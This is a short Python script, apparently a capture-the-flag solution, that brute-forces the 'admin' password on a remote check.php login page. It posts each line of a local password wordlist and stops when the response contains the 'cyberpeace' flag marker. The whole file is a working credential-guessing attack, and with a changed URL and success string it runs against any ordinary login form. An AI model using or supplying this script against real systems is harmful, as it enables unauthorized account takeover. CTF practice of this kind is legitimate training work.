import requests
url='http://111.200.241.244:57637/check.php'
with open(r'C:\Users\86666\Desktop\自己收集的准备要打印的文档\网络安全资源\字典\SaiDict-master\常见的用户账户和密码\pass.txt','r')as f:
    for i in f.readlines():
        data={'username':'admin','password':i.strip()}
        flag=requests.post(url,data=data).text
        if "cyberpeace" in flag:
            print(flag)
            print('密码为'+str(i))
            break
